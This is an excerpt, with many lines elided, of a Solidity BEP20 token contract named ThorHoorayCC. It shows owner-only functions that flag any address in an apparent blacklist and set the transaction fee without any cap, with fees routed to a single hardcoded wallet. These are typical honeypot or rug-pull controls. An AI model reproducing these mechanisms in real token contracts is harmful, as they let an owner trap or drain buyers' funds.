...
contract Thoocc is IBEP20, Auth {
    ...
    string constant _name = "ThorHoorayCC";
    string constant _symbol = "Thoocc";
    ...
    address private marketingFeeReceiver = 0xB71BD847E16653c7a00B4c6812577eEe1519712C;
    address private buybackFeeReceiver = 0xB71BD847E16653c7a00B4c6812577eEe1519712C;
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Thoocc seems to happen Insufficient Allowance!!!!");
        }
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Thoocc seems to happen Insufficient Balance!!!!");
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (recipient != UniswapV2Pair && recipient != DEAD && sender != owner && recipient != owner) {
            require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletSize, "Thoocc Transfer seems to happen amount exceeds the bag size!!!!");
        }
    ...
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "Thoocc TX Limit Exceeded");
    }
    ...
    function swapBack() internal swapping {
        ...
        require(MarketingSuccess, "Thoocc receiver rejected ETH transfer");
        (bool BuyBackSuccess, /* bytes memory data */) = payable(buybackFeeReceiver).call{value : amountBNBbuyback, gas : 30000}("");
        require(BuyBackSuccess, "Thoocc receiver rejected ETH transfer");
    ...
    function setDLThoocc(address addr, bool bv) external onlyOwner {
        isBBB[addr] = bv;
    }

    function setDEThoocc(uint256 fe) external onlyOwner {
        totalFee = fe;
    }
    ...
    function transferForeignTokenThoocc(address _token) public authorized {
        require(_token != address(this), "Thoocc Can't let you take all native token");
    ...
    function isOverLiquifiedThoocc(uint256 target, uint256 accuracy) public view returns (bool) {
